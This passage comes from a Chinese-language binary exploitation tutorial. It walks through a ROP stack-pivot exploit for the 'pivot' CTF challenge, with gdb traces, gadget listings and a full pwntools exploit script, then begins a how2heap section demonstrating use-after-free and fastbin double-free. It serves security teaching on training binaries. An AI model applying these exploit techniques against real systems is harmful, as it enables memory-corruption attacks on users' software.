PTR ds:0x804a024) EIP: 0x80488a0 (<pwnme+174>: ret) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x804889b <pwnme+169>: add esp,0x10 0x804889e <pwnme+172>: nop 0x804889f <pwnme+173>: leave => 0x80488a0 <pwnme+174>: ret 0x80488a1 <uselessFunction>: push ebp 0x80488a2 <uselessFunction+1>: mov ebp,esp 0x80488a4 <uselessFunction+3>: sub esp,0x8 0x80488a7 <uselessFunction+6>: call 0x80485f0 <foothold_function@plt> [------------------------------------stack-------------------------------------] 0000| 0xf755cf10 --> 0x80485f0 (<foothold_function@plt>: jmp DWORD PTR ds:0x804a024) 0004| 0xf755cf14 --> 0x80488c0 (<usefulGadgets>: pop eax) 0008| 0xf755cf18 --> 0x804a024 --> 0x80485f6 (<foothold_function@plt+6>: push 0x30) 0012| 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>: mov eax,DWORD PTR [eax]) 0016| 0xf755cf20 --> 0x8048571 (<_init+33>: pop ebx) 0020| 0xf755cf24 --> 0x1f7 0024| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>: add eax,ebx) 0028| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>: call eax) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x080488a0 in pwnme () gdb-peda$ x/10w 0xf755cf10 0xf755cf10: 0x080485f0 0x080488c0 0x0804a024 0x080488c4 0xf755cf20: 0x08048571 0x000001f7 0x080488c7 0x080486a3 0xf755cf30: 0x0000000a 0x00000000 EBP \u7684\u503c 0xf755cf0c \u88ab\u8d4b\u503c\u7ed9 ESP\uff0c\u5e76\u5c06 \u4e3bpayload \u7684 ebp \u8d4b\u503c\u7ed9 EBP\uff0c\u540c\u65f6 ESP+4= 0xf755cf10 \uff0c\u8fd9\u4e2a\u503c\u6b63\u662f\u6211\u4eec \u4e3bpayload \u7684\u5730\u5740\u3002 \u7b2c\u4e8c\u6b21 ret\uff1a gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EBX: 0x0 ECX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EDX: 0xf7731860 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0x0 ESP: 0xf755cf14 --> 0x80488c0 (<usefulGadgets>: pop eax) EIP: 0x80485f0 (<foothold_function@plt>: jmp DWORD PTR ds:0x804a024) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80485e0 <exit@plt>: jmp DWORD PTR ds:0x804a020 0x80485e6 <exit@plt+6>: push 0x28 0x80485eb <exit@plt+11>: jmp 0x8048580 => 0x80485f0 <foothold_function@plt>: jmp DWORD PTR ds:0x804a024 | 0x80485f6 <foothold_function@plt+6>: push 0x30 | 0x80485fb <foothold_function@plt+11>: jmp 0x8048580 | 0x8048600 <__libc_start_main@plt>: jmp DWORD PTR ds:0x804a028 | 0x8048606 <__libc_start_main@plt+6>: push 0x38 |-> 0x80485f6 <foothold_function@plt+6>: push 0x30 0x80485fb <foothold_function@plt+11>: jmp 0x8048580 0x8048600 <__libc_start_main@plt>: jmp DWORD PTR ds:0x804a028 0x8048606 <__libc_start_main@plt+6>: push 0x38 JUMP is taken [------------------------------------stack-------------------------------------] 0000| 0xf755cf14 --> 0x80488c0 (<usefulGadgets>: pop eax) 0004| 0xf755cf18 --> 0x804a024 --> 0x80485f6 (<foothold_function@plt+6>: push 0x30) 0008| 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>: mov eax,DWORD PTR [eax]) 0012| 0xf755cf20 --> 0x8048571 (<_init+33>: pop ebx) 0016| 0xf755cf24 --> 0x1f7 0020| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>: add eax,ebx) 0024| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>: call eax) 0028| 0xf755cf30 --> 0xa ('\\n') [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x080485f0 in foothold_function@plt () \u6210\u529f\u8df3\u8f6c\u5230 foothold_function@plt \uff0c\u63a5\u4e0b\u6765\u7cfb\u7edf\u901a\u8fc7 _dl_runtime_resolve \u7b49\u6b65\u9aa4\uff0c\u5c06\u771f\u6b63\u7684\u5730\u5740\u5199\u5165\u5230 .got.plt \u4e2d\uff0c\u6211\u4eec\u6784\u9020 gadget \u6cc4\u9732\u51fa\u8be5\u5730\u5740\u5730\u5740\uff0c\u7136\u540e\u8ba1\u7b97\u51fa ret2win() \u7684\u5730\u5740\uff0c\u8c03\u7528\u5b83\uff0c\u5c31\u6210\u529f\u4e86\u3002 \u5730\u5740\u6cc4\u9732\u7684\u8fc7\u7a0b\uff1a gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0x54 ('T') EBX: 0x0 ECX: 0x54 ('T') EDX: 0xf7731854 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0x0 ESP: 0xf755cf18 --> 0x804a024 --> 0xf7772770 (<foothold_function>: push ebp) EIP: 0x80488c0 (<usefulGadgets>: pop eax) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80488ba: xchg ax,ax 0x80488bc: xchg ax,ax 0x80488be: xchg ax,ax => 0x80488c0 <usefulGadgets>: pop eax 0x80488c1 <usefulGadgets+1>: ret 0x80488c2 <usefulGadgets+2>: xchg esp,eax 0x80488c3 <usefulGadgets+3>: ret 0x80488c4 <usefulGadgets+4>: mov eax,DWORD PTR [eax] [------------------------------------stack-------------------------------------] 0000| 0xf755cf18 --> 0x804a024 --> 0xf7772770 (<foothold_function>: push ebp) 0004| 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>: mov eax,DWORD PTR [eax]) 0008| 0xf755cf20 --> 0x8048571 (<_init+33>: pop ebx) 0012| 0xf755cf24 --> 0x1f7 0016| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>: add eax,ebx) 0020| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>: call eax) 0024| 0xf755cf30 --> 0xa ('\\n') 0028| 0xf755cf34 --> 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x080488c0 in usefulGadgets () gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0x804a024 --> 0xf7772770 (<foothold_function>: push ebp) EBX: 0x0 ECX: 0x54 ('T') EDX: 0xf7731854 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0x0 ESP: 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>: mov eax,DWORD PTR [eax]) EIP: 0x80488c1 (<usefulGadgets+1>: ret) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80488bc: xchg ax,ax 0x80488be: xchg ax,ax 0x80488c0 <usefulGadgets>: pop eax => 0x80488c1 <usefulGadgets+1>: ret 0x80488c2 <usefulGadgets+2>: xchg esp,eax 0x80488c3 <usefulGadgets+3>: ret 0x80488c4 <usefulGadgets+4>: mov eax,DWORD PTR [eax] 0x80488c6 <usefulGadgets+6>: ret [------------------------------------stack-------------------------------------] 0000| 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>: mov eax,DWORD PTR [eax]) 0004| 0xf755cf20 --> 0x8048571 (<_init+33>: pop ebx) 0008| 0xf755cf24 --> 0x1f7 0012| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>: add eax,ebx) 0016| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>: call eax) 0020| 0xf755cf30 --> 0xa ('\\n') 0024| 0xf755cf34 --> 0x0 0028| 0xf755cf38 --> 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x080488c1 in usefulGadgets () gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0x804a024 --> 0xf7772770 (<foothold_function>: push ebp) EBX: 0x0 ECX: 0x54 ('T') EDX: 0xf7731854 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0x0 ESP: 0xf755cf20 --> 0x8048571 (<_init+33>: pop ebx) EIP: 0x80488c4 (<usefulGadgets+4>: mov eax,DWORD PTR [eax]) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80488c1 <usefulGadgets+1>: ret 0x80488c2 <usefulGadgets+2>: xchg esp,eax 0x80488c3 <usefulGadgets+3>: ret => 0x80488c4 <usefulGadgets+4>: mov eax,DWORD PTR [eax] 0x80488c6 <usefulGadgets+6>: ret 0x80488c7 <usefulGadgets+7>: add eax,ebx 0x80488c9 <usefulGadgets+9>: ret 0x80488ca <usefulGadgets+10>: xchg ax,ax [------------------------------------stack-------------------------------------] 0000| 0xf755cf20 --> 0x8048571 (<_init+33>: pop ebx) 0004| 0xf755cf24 --> 0x1f7 0008| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>: add eax,ebx) 0012| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>: call eax) 0016| 0xf755cf30 --> 0xa ('\\n') 0020| 0xf755cf34 --> 0x0 0024| 0xf755cf38 --> 0x0 0028| 0xf755cf3c --> 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x080488c4 in usefulGadgets () gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xf7772770 (<foothold_function>: push ebp) EBX: 0x0 ECX: 0x54 ('T') EDX: 0xf7731854 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0x0 ESP: 0xf755cf20 --> 0x8048571 (<_init+33>: pop ebx) EIP: 0x80488c6 (<usefulGadgets+6>: ret) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80488c2 <usefulGadgets+2>: xchg esp,eax 0x80488c3 <usefulGadgets+3>: ret 0x80488c4 <usefulGadgets+4>: mov eax,DWORD PTR [eax] => 0x80488c6 <usefulGadgets+6>: ret 0x80488c7 <usefulGadgets+7>: add eax,ebx 0x80488c9 <usefulGadgets+9>: ret 0x80488ca <usefulGadgets+10>: xchg ax,ax 0x80488cc <usefulGadgets+12>: xchg ax,ax [------------------------------------stack-------------------------------------] 0000| 0xf755cf20 --> 0x8048571 (<_init+33>: pop ebx) 0004| 0xf755cf24 --> 0x1f7 0008| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>: add eax,ebx) 0012| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>: call eax) 0016| 0xf755cf30 --> 0xa ('\\n') 0020| 0xf755cf34 --> 0x0 0024| 0xf755cf38 --> 0x0 0028| 0xf755cf3c --> 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x080488c6 in usefulGadgets () pivot \u57fa\u672c\u540c\u4e0a\uff0c\u4f46\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u628a\u4fee\u6539 rsp \u7684\u90e8\u5206\u4e5f\u7528 gadgets \u6765\u5b9e\u73b0\uff0c\u8fd9\u6837\u505a\u7684\u597d\u5904\u662f\u6211\u4eec\u4e0d\u9700\u8981\u4f2a\u9020\u4e00\u4e2a\u5806\u6808\uff0c\u5373\u4e0d\u7528\u7ba1 ebp \u7684\u5730\u5740\u3002\u5982\uff1a payload_2 = \"A\" * 40 payload_2 += p64(pop_rax) payload_2 += p64(leakaddr) payload_2 += p64(xchg_rax_rsp) \u5b9e\u9645\u4e0a\uff0c\u6211\u672c\u4eba\u6b63\u662f\u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u56e0\u4e3a\u6211\u5728\u6784\u5efa payload \u65f6\uff0c 0x0000000000400ae0 <+165>: leave \uff0cleave;ret \u7684\u5730\u5740\u5b58\u5728\u622a\u65ad\u5b57\u7b26 0a \uff0c\u8fd9\u6837\u5c31\u4e0d\u80fd\u901a\u8fc7\u6b63\u5e38\u7684\u65b9\u5f0f\u5199\u5165\u7f13\u51b2\u533a\uff0c\u5f53\u7136\u8fd9\u4e5f\u662f\u53ef\u4ee5\u89e3\u51b3\u7684\uff0c\u6bd4\u5982\u5148\u5c06 0a \u6362\u6210\u975e\u622a\u65ad\u5b57\u7b26\uff0c\u4e4b\u540e\u518d\u4f7f\u7528\u5bc4\u5b58\u5668\u5c06 0a \u5199\u5165\u8be5\u5730\u5740\uff0c\u8fd9\u4e5f\u662f\u901a\u5e38\u89e3\u51b3\u7f13\u51b2\u533a\u4e2d\u622a\u65ad\u5b57\u7b26\u7684\u65b9\u6cd5\uff0c\u4f46\u662f\u8fd9\u6837\u505a\u96be\u5ea6\u592a\u5927\uff0c\u4e0d\u63a8\u8350\uff0c\u611f\u5174\u8da3\u7684\u8bfb\u8005\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\u3002 $ ropgadget --binary pivot --only \"mov|pop|call|add|xchg|ret\" 0x0000000000400b09 : add rax, rbp ; ret 0x000000000040098e : call rax 0x0000000000400b05 : mov rax, qword ptr [rax] ; ret 0x0000000000400b00 : pop rax ; ret 0x0000000000400900 : pop rbp ; ret 0x0000000000400b02 : xchg rax, rsp ; ret from pwn import * #context.log_level = 'debug' #context.terminal = ['konsole'] io = process('./pivot') elf = ELF('./pivot') libp = ELF('./libpivot.so') leave_ret = 0x0000000000400adf foothold_plt = elf.plt['foothold_function'] # 0x400850 foothold_got_plt = elf.got['foothold_function'] # 0x602048 pop_rax = 0x0000000000400b00 pop_rbp = 0x0000000000400900 mov_rax_rax = 0x0000000000400b05 xchg_rax_rsp = 0x0000000000400b02 add_rax_rbp = 0x0000000000400b09 call_rax = 0x000000000040098e foothold_sym = libp.symbols['foothold_function'] ret2win_sym = libp.symbols['ret2win'] offset = int(ret2win_sym - foothold_sym) # 0x14e leakaddr = int(io.recv().split()[20], 16) # calls foothold_function() to populate its GOT entry, then queries that value into EAX #gdb.attach(io) payload_1 = p64(foothold_plt) payload_1 += p64(pop_rax) payload_1 += p64(foothold_got_plt) payload_1 += p64(mov_rax_rax) payload_1 += p64(pop_rbp) payload_1 += p64(offset) payload_1 += p64(add_rax_rbp) payload_1 += p64(call_rax) io.sendline(payload_1) # rsp = leakaddr payload_2 = \"A\" * 40 payload_2 += p64(pop_rax) payload_2 += p64(leakaddr) payload_2 += p64(xchg_rax_rsp) io.sendline(payload_2) print io.recvall() \u8fd9\u6837\u57fa\u672c\u7684 ROP \u4e5f\u5c31\u4ecb\u7ecd\u5b8c\u4e86\uff0c\u66f4\u9ad8\u7ea7\u7684\u7528\u6cd5\u4f1a\u5728\u540e\u9762\u7684\u7ae0\u8282\u4e2d\u518d\u4ecb\u7ecd\uff0c\u6240\u8c13\u7684\u9ad8\u7ea7\uff0c\u4e5f\u5c31\u662f gadgets \u6784\u9020\u66f4\u52a0\u5de7\u5999\uff0c\u8fd0\u7528\u64cd\u4f5c\u7cfb\u7edf\u7684\u77e5\u8bc6\u66f4\u52a0\u5e95\u5c42\u800c\u5df2\u3002 3.1.6 Linux \u5806\u5229\u7528\uff08\u4e0a\uff09 Linux \u5806\u7b80\u4ecb how2heap first_fit fastbin_dup fastbin_dup_into_stack fastbin_dup_consolidate unsafe_unlink house_of_spirit \u53c2\u8003\u8d44\u6599 Linux \u5806\u7b80\u4ecb \u5806\u662f\u7a0b\u5e8f\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\uff0c\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u589e\u957f\u3002\u5f53\u524d Linux \u4f7f\u7528\u7684\u5806\u5206\u914d\u5668\u88ab\u79f0\u4e3a ptmalloc2\uff0c\u5728 glibc \u4e2d\u5b9e\u73b0\u3002 \u66f4\u8be6\u7ec6\u7684\u6211\u4eec\u5df2\u7ecf\u5728\u7ae0\u8282 1.5.8 \u4e2d\u4ecb\u7ecd\u4e86\uff0c\u7ae0\u8282 1.5.7 \u4e2d\u4e5f\u6709\u76f8\u5173\u5185\u5bb9\uff0c\u8bf7\u56de\u987e\u4e00\u4e0b\u3002 \u5bf9\u5806\u5229\u7528\u6765\u8bf4\uff0c\u4e0d\u7528\u4e8e\u6808\u4e0a\u7684\u6ea2\u51fa\u80fd\u591f\u76f4\u63a5\u8986\u76d6\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4ece\u800c\u63a7\u5236 EIP\uff0c\u53ea\u80fd\u901a\u8fc7\u95f4\u63a5\u624b\u6bb5\u6765\u52ab\u6301\u7a0b\u5e8f\u63a7\u5236\u6d41\u3002 how2heap how2heap \u662f\u7531 shellphish \u56e2\u961f\u5236\u4f5c\u7684\u5806\u5229\u7528\u6559\u7a0b\uff0c\u4ecb\u7ecd\u4e86\u591a\u79cd\u5806\u5229\u7528\u6280\u672f\uff0c\u8fd9\u7bc7\u6587\u7ae0\u6211\u4eec\u5c31\u901a\u8fc7\u8fd9\u4e2a\u6559\u7a0b\u6765\u5b66\u4e60\u3002\u63a8\u8350\u4f7f\u7528 Ubuntu 16.04 64\u4f4d\u7cfb\u7edf\u73af\u5883\uff0cglibc \u7248\u672c\u5982\u4e0b\uff1a $ file /lib/x86_64-linux-gnu/libc-2.23.so /lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped $ git clone https://github.com/shellphish/how2heap.git $ cd how2heap $ make \u8bf7\u6ce8\u610f\uff0c\u4e0b\u6587\u4e2d\u8d34\u51fa\u7684\u4ee3\u7801\u662f\u6211\u7b80\u5316\u8fc7\u7684\uff0c\u5254\u9664\u548c\u4fee\u6539\u4e86\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u6ce8\u91ca\u548c\u4ee3\u7801\uff0c\u4ee5\u65b9\u4fbf\u5b66\u4e60\u3002\u53e6\u5916\uff0c\u6b63\u5982\u7ae0\u8282 4.3 \u4e2d\u6240\u8bb2\u7684\uff0c\u6dfb\u52a0\u7f16\u8bd1\u53c2\u6570 CFLAGS += -fsanitize=address \u53ef\u4ee5\u68c0\u6d4b\u5185\u5b58\u9519\u8bef\u3002 \u4e0b\u8f7d\u6587\u4ef6 first_fit #include <stdio.h> #include <stdlib.h> #include <string.h> int main() { char* a = malloc(512); char* b = malloc(256); char* c; fprintf(stderr, \"1st malloc(512): %p\\n\", a); fprintf(stderr, \"2nd malloc(256): %p\\n\", b); strcpy(a, \"AAAAAAAA\"); strcpy(b, \"BBBBBBBB\"); fprintf(stderr, \"first allocation %p points to %s\\n\", a, a); fprintf(stderr, \"Freeing the first one...\\n\"); free(a); c = malloc(500); fprintf(stderr, \"3rd malloc(500): %p\\n\", c); strcpy(c, \"CCCCCCCC\"); fprintf(stderr, \"3rd allocation %p points to %s\\n\", c, c); fprintf(stderr, \"first allocation %p points to %s\\n\", a, a); } $ gcc -g first_fit.c $ ./a.out 1st malloc(512): 0x1380010 2nd malloc(256): 0x1380220 first allocation 0x1380010 points to AAAAAAAA Freeing the first one... 3rd malloc(500): 0x1380010 3rd allocation 0x1380010 points to CCCCCCCC first allocation 0x1380010 points to CCCCCCCC \u8fd9\u7b2c\u4e00\u4e2a\u7a0b\u5e8f\u5c55\u793a\u4e86 glibc \u5806\u5206\u914d\u7684\u7b56\u7565\uff0c\u5373 first-fit\u3002\u5728\u5206\u914d\u5185\u5b58\u65f6\uff0cmalloc \u4f1a\u5148\u5230 unsorted bin\uff08\u6216\u8005fastbins\uff09 \u4e2d\u67e5\u627e\u9002\u5408\u7684\u88ab free \u7684 chunk\uff0c\u5982\u679c\u6ca1\u6709\uff0c\u5c31\u4f1a\u628a unsorted bin \u4e2d\u7684\u6240\u6709 chunk \u5206\u522b\u653e\u5165\u5230\u6240\u5c5e\u7684 bins \u4e2d\uff0c\u7136\u540e\u518d\u53bb\u8fd9\u4e9b bins \u91cc\u53bb\u627e\u5408\u9002\u7684 chunk\u3002\u53ef\u4ee5\u770b\u5230\u7b2c\u4e09\u6b21 malloc \u7684\u5730\u5740\u548c\u7b2c\u4e00\u6b21\u76f8\u540c\uff0c\u5373 malloc \u627e\u5230\u4e86\u7b2c\u4e00\u6b21 free \u6389\u7684 chunk\uff0c\u5e76\u628a\u5b83\u91cd\u65b0\u5206\u914d\u3002 \u5728 gdb \u4e2d\u8c03\u8bd5\uff0c\u4e24\u4e2a malloc \u4e4b\u540e\uff08chunk \u4f4d\u4e8e malloc \u8fd4\u56de\u5730\u5740\u51cf\u53bb 0x10 \u7684\u4f4d\u7f6e\uff09\uff1a gef\u27a4 x/5gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000211 <-- chunk a 0x602010: 0x4141414141414141 0x0000000000000000 0x602020: 0x0000000000000000 gef\u27a4 x/5gx 0x602220-0x10 0x602210: 0x0000000000000000 0x0000000000000111 <-- chunk b 0x602220: 0x4242424242424242 0x0000000000000000 0x602230: 0x0000000000000000 \u7b2c\u4e00\u4e2a free \u4e4b\u540e\uff0c\u5c06\u5176\u52a0\u5165\u5230 unsorted bin \u4e2d\uff1a gef\u27a4 x/5gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000211 <-- chunk a [be freed] 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd pointer, bk pointer 0x602020: 0x0000000000000000 gef\u27a4 x/5gx 0x602220-0x10 0x602210: 0x0000000000000210 0x0000000000000110 <-- chunk b 0x602220: 0x4242424242424242 0x0000000000000000 0x602230: 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0x210, flags=PREV_INUSE) [+] Found 1 chunks in unsorted bin. \u7b2c\u4e09\u4e2a malloc \u4e4b\u540e\uff1a gef\u27a4 x/5gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000211 <-- chunk c 0x602010: 0x4343434343434343 0x00007ffff7dd1d00 0x602020: 0x0000000000000000 gef\u27a4 x/5gx 0x602220-0x10 0x602210: 0x0000000000000210 0x0000000000000111 <-- chunk b 0x602220: 0x4242424242424242 0x0000000000000000 0x602230: 0x0000000000000000 \u6240\u4ee5\u5f53\u91ca\u653e\u4e00\u5757\u5185\u5b58\u540e\u518d\u7533\u8bf7\u4e00\u5757\u5927\u5c0f\u7565\u5c0f\u4e8e\u7684\u7a7a\u95f4\uff0c\u90a3\u4e48 glibc \u503e\u5411\u4e8e\u5c06\u5148\u524d\u88ab\u91ca\u653e\u7684\u7a7a\u95f4\u91cd\u65b0\u5206\u914d\u3002 \u597d\u4e86\uff0c\u73b0\u5728\u6211\u4eec\u52a0\u4e0a\u5185\u5b58\u68c0\u6d4b\u53c2\u6570\u91cd\u65b0\u7f16\u8bd1\uff1a $ gcc -fsanitize=address -g first_fit.c $ ./a.out 1st malloc(512): 0x61500000fd00 2nd malloc(256): 0x611000009f00 first allocation 0x61500000fd00 points to AAAAAAAA Freeing the first one... 3rd malloc(500): 0x61500000fa80 3rd allocation 0x61500000fa80 points to CCCCCCCC ================================================================= ==4525==ERROR: AddressSanitizer: heap-use-after-free on address 0x61500000fd00 at pc 0x7f49d14a61e9 bp 0x7ffe40b526e0 sp 0x7ffe40b51e58 READ of size 2 at 0x61500000fd00 thread T0 #0 0x7f49d14a61e8 (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x601e8) #1 0x7f49d14a6bcc in vfprintf (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x60bcc) #2 0x7f49d14a6cf9 in fprintf (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x60cf9) #3 0x400b8b in main /home/firmy/how2heap/first_fit.c:23 #4 0x7f49d109c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #5 0x400878 in _start (/home/firmy/how2heap/a.out+0x400878) 0x61500000fd00 is located 0 bytes inside of 512-byte region [0x61500000fd00,0x61500000ff00) freed by thread T0 here: #0 0x7f49d14de2ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca) #1 0x400aa2 in main /home/firmy/how2heap/first_fit.c:17 #2 0x7f49d109c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) previously allocated by thread T0 here: #0 0x7f49d14de602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602) #1 0x400957 in main /home/firmy/how2heap/first_fit.c:6 #2 0x7f49d109c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) \u4e00\u4e2a\u5f88\u660e\u663e\u7684 use-after-free \u6f0f\u6d1e\u3002\u5173\u4e8e\u8fd9\u7c7b\u6f0f\u6d1e\u7684\u8be6\u7ec6\u5229\u7528\u8fc7\u7a0b\uff0c\u6211\u4eec\u4f1a\u5728\u540e\u9762\u7684\u7ae0\u8282\u91cc\u518d\u8bb2\u3002 fastbin_dup #include <stdio.h> #include <stdlib.h> #include <string.h> int main() { fprintf(stderr, \"Allocating 3 buffers.\\n\"); char *a = malloc(9); char *b = malloc(9); char *c = malloc(9); strcpy(a, \"AAAAAAAA\"); strcpy(b, \"BBBBBBBB\"); strcpy(c, \"CCCCCCCC\"); fprintf(stderr, \"1st malloc(9) %p points to %s\\n\", a, a); fprintf(stderr, \"2nd malloc(9) %p points to %s\\n\", b, b); fprintf(stderr, \"3rd malloc(9) %p points to %s\\n\", c, c); fprintf(stderr, \"Freeing the first one %p.\\n\", a); free(a); fprintf(stderr, \"Then freeing another one %p.\\n\", b); free(b); fprintf(stderr, \"Freeing the first one %p again.\\n\", a); free(a); fprintf(stderr, \"Allocating 3 buffers.\\n\"); char *d = malloc(9); char *e = malloc(9); char *f = malloc(9); strcpy(d, \"DDDDDDDD\"); fprintf(stderr, \"4st malloc(9) %p points to %s the first time\\n\", d, d); strcpy(e, \"EEEEEEEE\"); fprintf(stderr, \"5nd malloc(9) %p points to %s\\n\", e, e); strcpy(f, \"FFFFFFFF\"); fprintf(stderr, \"6rd malloc(9) %p points to %s the second time\\n\", f, f); } $ gcc -g fastbin_dup.c $ ./a.out Allocating 3 buffers. 1st malloc(9) 0x1c07010 points to AAAAAAAA 2nd malloc(9) 0x1c07030 points to BBBBBBBB 3rd malloc(9) 0x1c07050 points to CCCCCCCC Freeing the first one 0x1c07010. Then freeing another one 0x1c07030. Freeing the first one 0x1c07010 again. Allocating 3 buffers. 4st malloc(9) 0x1c07010 points to DDDDDDDD the first time 5nd malloc(9) 0x1c07030 points to EEEEEEEE 6rd malloc(9) 0x1c07010 points to FFFFFFFF the second time \u8fd9\u4e2a\u7a0b\u5e8f\u5c55\u793a\u4e86\u5229\u7528 fastbins \u7684 double-free \u653b\u51fb\uff0c\u53ef\u4ee5\u6cc4\u6f0f\u51fa\u4e00\u5757\u5df2\u7ecf\u88ab\u5206\u914d\u7684\u5185\u5b58\u6307\u9488\u3002fastbins \u53ef\u4ee5\u770b\u6210\u4e00\u4e2a LIFO \u7684\u6808\uff0c\u4f7f\u7528\u5355\u94fe\u8868\u5b9e\u73b0\uff0c\u901a\u8fc7 fastbin->fd \u6765\u904d\u5386 fastbins\u3002\u7531\u4e8e free \u7684\u8fc7\u7a0b\u4f1a\u5bf9 free list \u505a\u68c0\u67e5\uff0c\u6211\u4eec\u4e0d\u80fd\u8fde\u7eed\u4e24\u6b21 free \u540c\u4e00\u4e2a chunk\uff0c\u6240\u4ee5\u8fd9\u91cc\u5728\u4e24\u6b21 free \u4e4b\u95f4\uff0c\u589e\u52a0\u4e86\u4e00\u6b21\u5bf9\u5176\u4ed6 chunk \u7684 free \u8fc7\u7a0b\uff0c\u4ece\u800c\u7ed5\u8fc7\u68c0\u67e5\u987a\u5229\u6267\u884c\u3002\u7136\u540e\u518d malloc \u4e09\u6b21\uff0c\u5c31\u5728\u540c\u4e00\u4e2a\u5730\u5740 malloc \u4e86\u4e24\u6b21\uff0c\u4e5f\u5c31\u6709\u4e86\u4e24\u4e2a\u6307\u5411\u540c\u4e00\u5757\u5185\u5b58\u533a\u57df\u7684\u6307\u9488\u3002 libc-2.23 \u4e2d\u5bf9 double-free \u7684\u68c0\u67e5\u8fc7\u7a0b\u5982\u4e0b\uff1a /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) { errstr = \"double free or corruption (fasttop)\"; goto errout; } \u5b83\u5728\u68c0\u67e5 fast bin \u7684 double-free \u65f6\u53ea\u662f\u68c0\u67e5\u4e86\u7b2c\u4e00\u4e2a\u5757\u3002\u6240\u4ee5\u5176\u5b9e\u662f\u5b58\u5728\u7f3a\u9677\u7684\u3002 \u4e09\u4e2a malloc \u4e4b\u540e\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x602010: 0x4141414141414141 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 <-- top chunk 0x602070: 0x0000000000000000 \u7b2c\u4e00\u4e2a free \u4e4b\u540e\uff0cchunk a \u88ab\u6dfb\u52a0\u5230 fastbins \u4e2d\uff1a gef\u27a4 